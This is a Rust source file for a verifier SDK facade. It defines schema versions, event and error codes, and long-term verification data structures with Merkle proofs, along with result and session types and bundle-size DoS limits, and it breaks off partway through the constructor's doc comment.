#![forbid(unsafe_code)]

//! Universal Verifier SDK -- public facade module.
//!
//! This module re-exports the core verifier SDK types and operations for
//! external consumption. External verifiers depend on this crate to replay
//! capsules, verify signed replay bundles, and reproduce claim verdicts
//! without privileged internal access.
//!
//! # Security Posture
//!
//! This workspace crate publishes deterministic schema, digest, replay, and
//! Ed25519 signed-bundle helpers for external tooling. It remains separate
//! from the replacement-critical canonical verifier, but detached replay
//! bundle signatures are cryptographically verified.
//!
//! # Schema Version
//!
//! The current schema version is `vsdk-v1.0`. All capsules and manifests
//! must carry this version.
//!
//! # Event Codes
//!
//! - CAPSULE_CREATED: A new replay capsule has been created.
//! - CAPSULE_SIGNED: A capsule has been signed.
//! - CAPSULE_REPLAY_START: Capsule replay has started.
//! - CAPSULE_VERDICT_REPRODUCED: Capsule verdict has been reproduced.
//! - SDK_VERSION_CHECK: SDK version compatibility check performed.
//! - FN_LTV_VERIFY_AS_OF_COMPLETED: LTV verify-as-of-T completed.
//! - FN_LTV_WITNESS_ANTERIORITY_PROVEN: LTV witness anteriority accepted.
//! - FN_LTV_BACKDATING_REJECTED: LTV anti-backdating check rejected evidence.
//! - FN_LTV_HYBRID_SURVIVED_ALGO_DEATH: Hybrid suite remained valid after a
//!   constituent algorithm compromise record.
//!
//! # Error Codes
//!
//! - ERR_CAPSULE_SIGNATURE_INVALID: Capsule signature verification failed.
//! - ERR_CAPSULE_SCHEMA_MISMATCH: Capsule schema version is not supported.
//! - ERR_CAPSULE_REPLAY_DIVERGED: Replay output does not match expected hash.
//! - ERR_CAPSULE_VERDICT_MISMATCH: Reproduced verdict differs from original.
//! - ERR_SDK_VERSION_UNSUPPORTED: SDK version is not supported.
//! - ERR_CAPSULE_ACCESS_DENIED: Privileged access attempted during replay.
//!
//! # Invariants
//!
//! - INV-CAPSULE-STABLE-SCHEMA: Capsule schema format is stable across SDK versions.
//! - INV-CAPSULE-VERSIONED-API: Every API surface carries a version identifier.
//! - INV-CAPSULE-NO-PRIVILEGED-ACCESS: External replay requires no privileged internal access.
//! - INV-CAPSULE-VERDICT-REPRODUCIBLE: Same capsule always produces the same verdict.

use std::{
    collections::{BTreeMap, BTreeSet},
    fmt,
    sync::atomic::{AtomicU64, Ordering},
};

use chrono::{SecondsFormat, Utc};
use ed25519_dalek::{Signer, SigningKey, VerifyingKey};
use hex::FromHex;
use rand_core::{OsRng, RngCore};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use subtle::ConstantTimeEq;
use tree_sitter::{Language, Node, Parser as JsParser};

pub mod bundle;
pub mod calibration;
pub mod capsule;
pub mod counterfactual;
pub mod honesty_manifest;
pub mod resolution;

/// SDK version string for compatibility checks.
/// INV-CAPSULE-VERSIONED-API: every API surface carries a version identifier.
pub const SDK_VERSION: &str = "vsdk-v1.0";

/// Minimum supported SDK version.
pub const SDK_VERSION_MIN: &str = "vsdk-v1.0";

/// Security posture marker for the workspace SDK with cryptographic verification.
pub const CRYPTOGRAPHIC_SECURITY_POSTURE: &str = "cryptographic_ed25519_authenticated";

/// Stable rule id for guardrails that must fence the workspace SDK surface.
pub const STRUCTURAL_ONLY_RULE_ID: &str = "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK";

/// Bundle artifact path for the migration-equivalence capsule consumed by
/// `VerifierSdk::verify_migration_artifact`.
pub const MIGRATION_EQUIVALENCE_ARTIFACT_PATH: &str = "artifacts/migration_equivalence.json";

/// Schema marker for trustless SDK-side migration equivalence capsules.
pub const MIGRATION_EQUIVALENCE_SCHEMA_VERSION: &str = "vsdk-migration-equivalence-v1.0";

/// Schema marker for SDK-side long-term verification evidence.
pub const LONG_TERM_VERIFICATION_SCHEMA_VERSION: &str = "vsdk-ltv-evidence-v1.0";

/// Stable statement emitted on successful LTV verification.
pub const LONG_TERM_VERIFICATION_PASS_DETAIL: &str =
    "valid and provably anterior to any key compromise on record";

const MIGRATION_SOURCE_HASH_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:migration-source:v1:";
const MIGRATION_AST_HASH_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:migration-js-ast:v1:";
const MIGRATION_LOCKSTEP_VERDICT_HASH_DOMAIN: &[u8] =
    b"frankenengine-verifier-sdk:migration-lockstep-verdict:v1:";
const MIGRATION_EQUIVALENCE_BINDING_HASH_DOMAIN: &[u8] =
    b"frankenengine-verifier-sdk:migration-equivalence-binding:v1:";
const LONG_TERM_ARTIFACT_MARKER_HASH_DOMAIN: &[u8] =
    b"frankenengine-verifier-sdk:ltv-artifact-marker:v1:";
const MMR_ROOT_REATTESTATION_HASH_DOMAIN: &[u8] = b"mmr_root_reattestation_v1:";
const MMR_ROOT_WITNESS_HASH_DOMAIN: &[u8] = b"mmr_root_witness_v1:";
const MMR_LEAF_HASH_DOMAIN: &[u8] = b"mmr_proofs_leaf_v1:";
const MMR_NODE_HASH_DOMAIN: &[u8] = b"mmr_proofs_node_v1:";
const THRESHOLD_SIGNING_MESSAGE_DOMAIN: &[u8] = b"threshold_sig_verify_v2:";
const MMR_ROOT_REATTESTATION_SCHEMA_VERSION: &str = "mmr-root-reattestation-v1";
const MMR_ROOT_WITNESS_SCHEMA_VERSION: &str = "mmr-root-witness-v1";
const MMR_ROOT_WITNESS_ARTIFACT_ID: &str = "mmr-root-witness";
const MMR_ROOT_WITNESS_CONNECTOR_ID: &str = "franken-node-root-witness";
const MAX_LONG_TERM_SUITE_RECORDS: usize = 128;
const MAX_LONG_TERM_REATTESTATION_LINKS: usize = 64;
const MAX_LONG_TERM_LEAF_HASHES: usize = 4096;
const MAX_LONG_TERM_AUDIT_PATH_ENTRIES: usize = 128;
const MAX_LONG_TERM_WITNESS_SIGNATURES: usize = 256;
const MAX_LONG_TERM_SIGNER_KEYS: usize = 256;

// ---------------------------------------------------------------------------
// Event codes (public-facing)
// ---------------------------------------------------------------------------

/// Event: a new replay capsule has been created.
pub const CAPSULE_CREATED: &str = "CAPSULE_CREATED";
/// Event: a capsule has been signed.
pub const CAPSULE_SIGNED: &str = "CAPSULE_SIGNED";
/// Event: capsule replay has started.
pub const CAPSULE_REPLAY_START: &str = "CAPSULE_REPLAY_START";
/// Event: capsule verdict has been reproduced.
pub const CAPSULE_VERDICT_REPRODUCED: &str = "CAPSULE_VERDICT_REPRODUCED";
/// Event: SDK version compatibility check performed.
pub const SDK_VERSION_CHECK: &str = "SDK_VERSION_CHECK";
/// Event: long-term verify-as-of-T completed.
pub const FN_LTV_VERIFY_AS_OF_COMPLETED: &str = "FN_LTV_VERIFY_AS_OF_COMPLETED";
/// Event: witness anteriority was proven for an LTV result.
pub const FN_LTV_WITNESS_ANTERIORITY_PROVEN: &str = "FN_LTV_WITNESS_ANTERIORITY_PROVEN";
/// Event: LTV verification rejected late or post-compromise evidence.
pub const FN_LTV_BACKDATING_REJECTED: &str = "FN_LTV_BACKDATING_REJECTED";
/// Event: a hybrid LTV crypto suite survived a constituent algorithm death.
pub const FN_LTV_HYBRID_SURVIVED_ALGO_DEATH: &str = "FN_LTV_HYBRID_SURVIVED_ALGO_DEATH";

// ---------------------------------------------------------------------------
// Error codes (public-facing)
// ---------------------------------------------------------------------------

/// Error: capsule signature verification failed.
pub const ERR_CAPSULE_SIGNATURE_INVALID: &str = "ERR_CAPSULE_SIGNATURE_INVALID";
/// Error: capsule schema version is not supported.
pub const ERR_CAPSULE_SCHEMA_MISMATCH: &str = "ERR_CAPSULE_SCHEMA_MISMATCH";
/// Error: replay output does not match expected hash.
pub const ERR_CAPSULE_REPLAY_DIVERGED: &str = "ERR_CAPSULE_REPLAY_DIVERGED";
/// Error: reproduced verdict differs from original.
pub const ERR_CAPSULE_VERDICT_MISMATCH: &str = "ERR_CAPSULE_VERDICT_MISMATCH";
/// Error: SDK version is not supported.
pub const ERR_SDK_VERSION_UNSUPPORTED: &str = "ERR_SDK_VERSION_UNSUPPORTED";
/// Error: privileged access attempted during replay.
pub const ERR_CAPSULE_ACCESS_DENIED: &str = "ERR_CAPSULE_ACCESS_DENIED";

// ---------------------------------------------------------------------------
// Invariants (public-facing)
// ---------------------------------------------------------------------------

/// Invariant: capsule schema format is stable across SDK versions.
pub const INV_CAPSULE_STABLE_SCHEMA: &str = "INV-CAPSULE-STABLE-SCHEMA";
/// Invariant: every API surface carries a version identifier.
pub const INV_CAPSULE_VERSIONED_API: &str = "INV-CAPSULE-VERSIONED-API";
/// Invariant: external replay requires no privileged internal access.
pub const INV_CAPSULE_NO_PRIVILEGED_ACCESS: &str = "INV-CAPSULE-NO-PRIVILEGED-ACCESS";
/// Invariant: same capsule always produces the same verdict.
pub const INV_CAPSULE_VERDICT_REPRODUCIBLE: &str = "INV-CAPSULE-VERDICT-REPRODUCIBLE";

// ---------------------------------------------------------------------------
// SDK version check
// ---------------------------------------------------------------------------

/// Check whether a given SDK version string is supported.
///
/// Returns `Ok(())` if supported, or an error string if not.
///
/// # Examples
///
/// ```rust
/// use frankenengine_verifier_sdk::{check_sdk_version, SDK_VERSION};
///
/// assert!(check_sdk_version(SDK_VERSION).is_ok());
/// assert!(check_sdk_version("vsdk-v0.0").is_err());
/// ```
/// Validates SDK version compatibility against required minimum version.
///
/// # INV-CAPSULE-VERSIONED-API
/// # INV-CAPSULE-STABLE-SCHEMA
pub fn check_sdk_version(version: &str) -> Result<(), String> {
    if version == SDK_VERSION {
        Ok(())
    } else {
        Err(format!(
            "{}: requested={}, supported={}",
            ERR_SDK_VERSION_UNSUPPORTED, version, SDK_VERSION
        ))
    }
}

/// A structured audit event for SDK operations.
#[derive(Debug, Clone)]
pub struct SdkEvent {
    pub event_code: &'static str,
    pub detail: String,
}

impl SdkEvent {
    /// Create a structured SDK audit event.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::{SdkEvent, SDK_VERSION_CHECK};
    ///
    /// let event = SdkEvent::new(SDK_VERSION_CHECK, "version accepted");
    /// assert_eq!(event.event_code, SDK_VERSION_CHECK);
    /// assert_eq!(event.detail, "version accepted");
    /// ```
    pub fn new(event_code: &'static str, detail: impl Into<String>) -> Self {
        Self {
            event_code,
            detail: detail.into(),
        }
    }
}

/// Build a deterministic public audit transcript for SDK-side LTV results.
pub fn long_term_verification_audit_events(result: &VerificationResult) -> Vec<SdkEvent> {
    if !matches!(result.operation, VerificationOperation::LongTermValidation) {
        return Vec::new();
    }

    let mut events = vec![SdkEvent::new(
        FN_LTV_VERIFY_AS_OF_COMPLETED,
        format!(
            "verdict={:?}; confidence_score={:.2}",
            result.verdict, result.confidence_score
        ),
    )];

    if result.checked_assertions.iter().any(|assertion| {
        matches!(
            assertion.assertion.as_str(),
            "ltv_witness_precedes_key_compromise_records"
        ) && assertion.passed
    }) {
        events.push(SdkEvent::new(
            FN_LTV_WITNESS_ANTERIORITY_PROVEN,
            LONG_TERM_VERIFICATION_PASS_DETAIL,
        ));
    }

    if result.checked_assertions.iter().any(|assertion| {
        matches!(
            assertion.assertion.as_str(),
            "ltv_witness_anterior_to_as_of" | "ltv_witness_precedes_key_compromise_records"
        ) && !assertion.passed
    }) {
        events.push(SdkEvent::new(
            FN_LTV_BACKDATING_REJECTED,
            "late or post-compromise witness evidence rejected",
        ));
    }

    if result.checked_assertions.iter().any(|assertion| {
        matches!(
            assertion.assertion.as_str(),
            "ltv_crypto_suite_valid_at_claimed_time"
        ) && assertion.passed
            && assertion.detail.contains("hybrid")
    }) {
        events.push(SdkEvent::new(
            FN_LTV_HYBRID_SURVIVED_ALGO_DEATH,
            "hybrid crypto suite remained valid for the claimed artifact time",
        ));
    }

    events
}

/// Result verdict exposed by the stable verifier facade.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum VerificationVerdict {
    Pass,
    Fail,
    Inconclusive,
}

impl From<capsule::CapsuleVerdict> for VerificationVerdict {
    fn from(value: capsule::CapsuleVerdict) -> Self {
        match value {
            capsule::CapsuleVerdict::Pass => Self::Pass,
            capsule::CapsuleVerdict::Fail => Self::Fail,
            capsule::CapsuleVerdict::Inconclusive => Self::Inconclusive,
        }
    }
}

/// Stable facade operation names for result and session audit trails.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum VerificationOperation {
    Claim,
    MigrationArtifact,
    TrustState,
    LongTermValidation,
    Workflow,
    WorkflowExecution,
}

/// Stable workflow names accepted by the verifier facade executor.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ValidationWorkflow {
    ReleaseValidation,
    IncidentValidation,
    ComplianceAudit,
}

/// Append-only transparency log entry for facade verification results.
///
/// Records a verification result in a cryptographically verifiable transparency log
/// with Merkle tree inclusion proofs. This enables external parties to audit the
/// complete history of verification decisions and detect tampering or omissions.
///
/// # Examples
///
/// ```rust
/// use frankenengine_verifier_sdk::TransparencyLogEntry;
///
/// // Create a transparency log entry with inclusion proof
/// let entry = TransparencyLogEntry {
///     result_hash: "sha256:abc123def456".to_string(),
///     timestamp: "2024-01-01T00:00:00Z".to_string(),
///     verifier_id: "verifier://production".to_string(),
///     merkle_proof: vec![
///         "root:deadbeefcafe".to_string(),
///         "leaf_index:42".to_string(),
///         "tree_size:1000".to_string(),
///         "left:cafebabe".to_string(),
///         "right:beefdead".to_string(),
///     ],
/// };
///
/// // Verify the entry contains the expected proof components
/// assert!(entry.merkle_proof.iter().any(|p| p.starts_with("root:")));
/// assert!(entry.merkle_proof.iter().any(|p| p.starts_with("leaf_index:")));
/// ```
///
/// # Merkle Proof Format
///
/// The `merkle_proof` field encodes the audit path required to verify inclusion:
/// - `root:<hex>`: Merkle tree root hash at append time
/// - `leaf_index:<n>`: Zero-based position of this entry in the tree
/// - `tree_size:<n>`: Total number of entries in the tree at append time
/// - `left:<hex>` / `right:<hex>`: Sibling hashes from leaf to root level
///
/// # Security Properties
///
/// - **Tamper detection**: Any modification to historical entries breaks the Merkle proof
/// - **Append-only**: Entries cannot be removed without invalidating subsequent proofs
/// - **Verifiable inclusion**: Third parties can verify an entry exists at the claimed position
/// - **Timeline integrity**: Timestamp order can be verified against tree growth
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TransparencyLogEntry {
    pub result_hash: String,
    pub timestamp: String,
    pub verifier_id: String,
    /// Encoded Merkle audit path at append time:
    /// `root:<hex>`, `leaf_index:<n>`, `tree_size:<n>`, then `left:<hex>` / `right:<hex>`
    /// sibling hashes from the leaf level toward the root.
    pub merkle_proof: Vec<String>,
}

/// Result of one assertion checked by the facade.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AssertionResult {
    pub assertion: String,
    pub passed: bool,
    pub detail: String,
}

/// Stable result type produced by the workspace verifier facade.
///
/// `verifier_signature` is an SDK-local integrity binding over the result
/// payload. Claim verification still depends on Ed25519-authenticated replay
/// capsules rather than structural-only capsule shortcuts.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct VerificationResult {
    pub operation: VerificationOperation,
    pub verdict: VerificationVerdict,
    pub confidence_score: f64,
    pub checked_assertions: Vec<AssertionResult>,
    pub execution_timestamp: String,
    pub verifier_identity: String,
    pub artifact_binding_hash: String,
    pub verifier_signature: String,
    pub sdk_version: String,
    #[serde(skip, default)]
    result_origin_nonce: String,
}

/// Artifact metadata bound into an SDK long-term verification proof.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermArtifactEvidence {
    pub artifact_id: String,
    pub artifact_hash: String,
    pub crypto_suite: String,
    pub claimed_at_unix_seconds: u64,
    pub marker_hash: String,
}

/// Validity interval and compromise marker for one cryptographic suite.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermCryptoSuiteRecord {
    pub crypto_suite: String,
    pub valid_from_unix_seconds: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub valid_until_unix_seconds: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub compromised_at_unix_seconds: Option<u64>,
}

/// Current Merkle/MMR root for SDK-side LTV verification.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrRoot {
    pub tree_size: u64,
    pub root_hash: String,
}

/// Inclusion proof for the artifact marker leaf under a retained MMR root.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrInclusionProof {
    pub leaf_index: u64,
    pub tree_size: u64,
    pub leaf_hash: String,
    pub audit_path: Vec<String>,
}

/// Prefix proof showing one retained MMR root is included in a later root.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrPrefixProof {
    pub prefix_size: u64,
    pub super_tree_size: u64,
    pub prefix_root_hash: String,
    pub super_root_hash: String,
    pub prefix_root_from_super: String,
    pub super_leaf_hashes: Vec<String>,
}

/// Re-attestation link binding an older MMR root to a newer root.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrRootReattestation {
    pub schema_version: String,
    pub previous_root: LongTermMmrRoot,
    pub attested_root: LongTermMmrRoot,
    pub prefix_proof: LongTermMmrPrefixProof,
    pub issued_at_unix_seconds: u64,
    pub crypto_suite: String,
    pub attestation_hash: String,
}

/// Ordered re-attestation chain from the artifact inclusion root to a witnessed root.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrRootReattestationChain {
    pub origin_root: LongTermMmrRoot,
    pub attestations: Vec<LongTermMmrRootReattestation>,
}

/// One threshold signer public key for root-witness verification.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermSignerKey {
    pub key_id: String,
    pub public_key_hex: String,
}

/// Threshold configuration carried by a root-witness receipt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermThresholdConfig {
    pub threshold: u32,
    pub total_signers: u32,
    pub signer_keys: Vec<LongTermSignerKey>,
}

/// One witness partial signature over a publication artifact.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermPartialSignature {
    pub signer_id: String,
    pub key_id: String,
    pub signature_hex: String,
}

/// Publication artifact binding root-witness signatures to a content hash.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermPublicationArtifact {
    pub artifact_id: String,
    pub connector_id: String,
    pub content_hash: String,
    pub signatures: Vec<LongTermPartialSignature>,
}

/// Canonical statement cosigned by independent root witnesses.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrRootWitnessStatement {
    pub schema_version: String,
    pub root: LongTermMmrRoot,
    pub observed_at_unix_seconds: u64,
    pub witness_group_id: String,
    pub witness_policy_id: String,
    pub content_hash: String,
}

/// Threshold-cosigned receipt proving a root was observed by independent witnesses.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermMmrRootWitnessReceipt {
    pub statement: LongTermMmrRootWitnessStatement,
    pub threshold_config: LongTermThresholdConfig,
    pub witness_artifact: LongTermPublicationArtifact,
    pub trace_id: String,
    pub timestamp: String,
}

/// Self-contained SDK evidence for verify-as-of-T / LTV mode.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LongTermVerificationEvidence {
    pub schema_version: String,
    pub as_of_unix_seconds: u64,
    pub artifact: LongTermArtifactEvidence,
    pub suite_records: Vec<LongTermCryptoSuiteRecord>,
    pub inclusion_proof: LongTermMmrInclusionProof,
    pub reattestation_chain: LongTermMmrRootReattestationChain,
    pub witness_receipt: LongTermMmrRootWitnessReceipt,
}

/// Single append-only step in a verification session.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SessionStep {
    pub step_index: usize,
    pub operation: VerificationOperation,
    pub verdict: VerificationVerdict,
    pub artifact_binding_hash: String,
    pub timestamp: String,
    pub step_signature: String,
}

/// Stateful multi-step verification workflow.
#[derive(Debug, Clone, PartialEq)]
pub struct VerificationSession {
    pub session_id: String,
    pub verifier_identity: String,
    pub created_at: String,
    steps: Vec<SessionStep>,
    pub sealed: bool,
    pub final_verdict: Option<VerificationVerdict>,
    origin_session_id: String,
    origin_verifier_identity: String,
    origin_created_at: String,
    origin_session_nonce: String,
    session_nonce: String,
}

/// Error returned by the stable verifier facade.
#[derive(Debug, Clone, PartialEq)]
pub enum VerifierSdkError {
    UnsupportedSdk(String),
    Capsule(capsule::CapsuleError),
    Bundle(bundle::BundleError),
    CounterfactualCapability(counterfactual::CounterfactualCapabilityError),
    UnauthenticatedStructuralBundle {
        bundle_id: String,
        verifier_identity: String,
    },
    InvalidVerifierIdentity {
        actual: String,
        reason: String,
    },
    InvalidSessionId {
        actual: String,
        reason: String,
    },
    EmptyTrustAnchor,
    MalformedTrustAnchor {
        actual: String,
    },
    TrustAnchorMismatch {
        expected: String,
        actual: String,
    },
    SessionSealed(String),
    SessionVerifierMismatch {
        expected: String,
        actual: String,
    },
    SessionProvenanceMismatch {
        field: &'static str,
        expected: String,
        actual: String,
    },
    SessionStepSequenceMismatch {
        expected: usize,
        actual: usize,
    },
    SessionStepSignatureMismatch {
        step_index: usize,
        actual: String,
    },
    BoundedStateExceeded {
        surface: &'static str,
        max: usize,
    },
    ResultSignatureMismatch {
        expected: String,
        actual: String,
    },
    /// The submitted `result_origin_nonce` did not match the SDK instance's
    /// origin nonce.
    ///
    /// The server-side `expected` value is intentionally NOT included on this
    /// variant: `result_origin_nonce` is a per-instance secret (random,
    /// `#[serde(skip)]` on `VerifierSdk`) used to authenticate that a
    /// `VerificationResult` was produced locally. Surfacing the expected nonce
    /// in an error returned to a caller who submitted a forged result would
    /// hand them the very secret they need to make the next attempt pass —
    /// turning the error into a single-shot oracle for forging origin
    /// authentication. Operators who need the expected value for diagnostics
    /// can read it from `VerifierSdk::result_origin_nonce` (in-process) or
    /// from internal trace logs that include the SDK identity.
    ResultOriginMismatch {
        actual: String,
    },
    InvalidTransparencyLogEntry {
        index: usize,
        reason: String,
    },
    NonceCounterExhausted,
    /// Inbound bundle bytes exceeded the configured DoS-prevention cap.
    BundleTooLarge {
        actual_bytes: usize,
        max_bytes: usize,
    },
    EmptyWorkflowId,
    EmptyWorkflowStages,
    WorkflowStageValidationFailed {
        stage: String,
        reason: String,
    },
    Json(String),
}

impl fmt::Display for VerifierSdkError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedSdk(message) => write!(formatter, "{message}"),
            Self::Capsule(source) => write!(formatter, "capsule verification failed: {source}"),
            Self::Bundle(source) => write!(formatter, "bundle verification failed: {source}"),
            Self::CounterfactualCapability(source) => {
                write!(
                    formatter,
                    "counterfactual capability validation failed: {source}"
                )
            }
            Self::UnauthenticatedStructuralBundle {
                bundle_id,
                verifier_identity,
            } => write!(
                formatter,
                "replay bundle {bundle_id} for {verifier_identity} is structural-only and cannot satisfy authenticated verifier provenance"
            ),
            Self::InvalidVerifierIdentity { actual: _, reason } => {
                write!(formatter, "verifier identity is invalid: {reason}")
            }
            Self::InvalidSessionId { actual: _, reason } => {
                write!(formatter, "verification session id is invalid: {reason}")
            }
            Self::EmptyTrustAnchor => write!(formatter, "trust anchor is empty"),
            Self::MalformedTrustAnchor { actual: _ } => write!(
                formatter,
                "trust anchor must be a canonical lowercase 64-nybble sha256 digest"
            ),
            Self::TrustAnchorMismatch {
                expected: _,
                actual: _,
            } => write!(
                formatter,
                "trust anchor mismatch (expected and actual digests redacted)"
            ),
            Self::SessionSealed(session_id) => {
                write!(formatter, "verification session {session_id} is sealed")
            }
            Self::SessionVerifierMismatch {
                expected: _,
                actual: _,
            } => write!(
                formatter,
                "verification session verifier mismatch (expected and actual verifier identities redacted)"
            ),
            Self::SessionProvenanceMismatch {
                field,
                expected: _,
                actual: _,
            } => write!(
                formatter,
                "verification session provenance mismatch for {field} (values redacted)"
            ),
            Self::SessionStepSequenceMismatch { expected, actual } => write!(
                formatter,
                "verification session step sequence mismatch: expected={expected}, actual={actual}"
            ),
            Self::SessionStepSignatureMismatch {
                step_index,
                actual: _,
            } => write!(
                formatter,
                "verification session step signature mismatch at index {step_index} (signatures redacted)"
            ),
            Self::BoundedStateExceeded { surface, max } => write!(
                formatter,
                "verifier SDK bounded state exceeded for {surface}: max={max}"
            ),
            Self::ResultSignatureMismatch {
                expected: _,
                actual: _,
            } => write!(
                formatter,
                "verifier SDK result signature mismatch (expected and actual signatures redacted)"
            ),
            Self::ResultOriginMismatch { actual } => write!(
                formatter,
                "verifier SDK result origin mismatch: submitted={actual} \
                 (expected nonce redacted to prevent oracle leakage of the \
                 server-side per-instance result_origin_nonce)"
            ),
            Self::InvalidTransparencyLogEntry { index, reason } => write!(
                formatter,
                "transparency log entry {index} is invalid: {reason}"
            ),
            Self::NonceCounterExhausted => write!(
                formatter,
                "nonce counter exhausted - no more unique nonces available"
            ),
            Self::BundleTooLarge {
                actual_bytes,
                max_bytes,
            } => write!(
                formatter,
                "verifier SDK bundle exceeds DoS-prevention size cap: actual={actual_bytes} bytes, max={max_bytes} bytes"
            ),
            Self::EmptyWorkflowId => write!(formatter, "workflow ID cannot be empty"),
            Self::EmptyWorkflowStages => write!(formatter, "workflow stages cannot be empty"),
            Self::WorkflowStageValidationFailed { stage, reason } => write!(
                formatter,
                "workflow stage '{}' validation failed: {}",
                stage, reason
            ),
            Self::Json(message) => write!(formatter, "verifier SDK JSON error: {message}"),
        }
    }
}

impl std::error::Error for VerifierSdkError {}

/// Standard result type returned by fallible verifier facade operations.
pub type VerifierSdkResult<T> = Result<T, VerifierSdkError>;

impl From<capsule::CapsuleError> for VerifierSdkError {
    fn from(source: capsule::CapsuleError) -> Self {
        Self::Capsule(source)
    }
}

impl From<bundle::BundleError> for VerifierSdkError {
    fn from(source: bundle::BundleError) -> Self {
        Self::Bundle(source)
    }
}

impl From<counterfactual::CounterfactualCapabilityError> for VerifierSdkError {
    fn from(source: counterfactual::CounterfactualCapabilityError) -> Self {
        Self::CounterfactualCapability(source)
    }
}

impl From<resolution::ResolutionReceiptError> for VerifierSdkError {
    fn from(source: resolution::ResolutionReceiptError) -> Self {
        Self::Json(source.to_string())
    }
}

const RESULT_ORIGIN_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:result-origin:v1:";
const SESSION_STEP_SIGNATURE_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:session-step:v1:";
const SESSION_NONCE_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:session-nonce:v1:";
const TRANSPARENCY_LOG_LEAF_DOMAIN: &[u8] = b"frankenengine-verifier-sdk:transparency-leaf:v1:";
const TRANSPARENCY_MERKLE_PARENT_DOMAIN: &[u8] =
    b"frankenengine-verifier-sdk:transparency-merkle-parent:v1:";
const MAX_VERIFIER_IDENTITY_NAME_LEN: usize = 255;
const MAX_SESSION_ID_LEN: usize = 255;
/// Maximum recorded steps retained in one verifier SDK session.
pub const MAX_VERIFICATION_SESSION_STEPS: usize = 1024;
/// Maximum entries accepted in one in-memory verifier SDK transparency log.
pub const MAX_TRANSPARENCY_LOG_ENTRIES: usize = 1024;
/// Default upper bound on raw bundle bytes accepted by [`VerifierSdk::validate_bundle`].
///
/// External callers may submit attacker-controlled bytes; without an upper bound the
/// downstream parser and signature pipeline are forced to walk arbitrarily large
/// inputs, which is the primary DoS surface called out in bd-34svd.
///
/// The default is 256 KiB — large enough for every legitimate replay bundle exercised
/// in the conformance suite (typical canonical bundles are ~8-64 KiB) and small enough
/// that even a sustained attacker stream is bounded by hardware memory bandwidth, not
/// by parser complexity. Operators can raise or lower this via the
/// [`VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY`] entry on
/// [`VerifierSdk::config`]; values above the absolute cap are rejected to keep a
/// fail-closed ceiling on memory pressure even when the operator config is hostile.
pub const DEFAULT_MAX_BUNDLE_SIZE_BYTES: usize = 256 * 1024;
/// Absolute ceiling enforced on the configurable bundle size limit.
///
/// The configurable value (via [`VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY`]) is
/// always clamped down to this cap, so a misconfigured or hostile operator config
/// cannot widen the DoS surface beyond what the SDK is willing to accept.
pub const ABSOLUTE_MAX_BUNDLE_SIZE_BYTES: usize = 16 * 1024 * 1024;
/// Config-map key that overrides the bundle size cap on a [`VerifierSdk`] instance.
///
/// Setting this in [`VerifierSdk::config`] before calling
/// [`VerifierSdk::validate_bundle`] applies that limit (clamped to
/// [`ABSOLUTE_MAX_BUNDLE_SIZE_BYTES`]) for subsequent calls; absent or unparseable
/// values fall back to [`DEFAULT_MAX_BUNDLE_SIZE_BYTES`].
pub const VERIFIER_SDK_MAX_BUNDLE_SIZE_BYTES_CONFIG_KEY: &str = "max_bundle_size_bytes";
static SESSION_NONCE_COUNTER: AtomicU64 = AtomicU64::new(1);

/// Top-level facade for external verifier integrations.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct VerifierSdk {
    pub verifier_identity: String,
    pub sdk_version: String,
    pub config: BTreeMap<String, String>,
    #[serde(skip, default = "default_result_origin_nonce")]
    result_origin_nonce: String,
    #[serde(skip, default = "default_signing_key")]
    signing_key: SigningKey,
    #[serde(skip, default = "default_verifying_key")]
    verifying_key: VerifyingKey,
}

impl VerifierSdk {
    /// Create a new verifier SDK facade instance.
    ///
    /// # Examples
    ///
    /// ```rust
    /// use frankenengine_verifier_sdk::{VerifierSdk, SDK_VERSION};
    ///
    /// let sdk = VerifierSdk::new("verifier://docs");
    /// assert_eq!(sdk.verifier_identity, "verifier://docs");
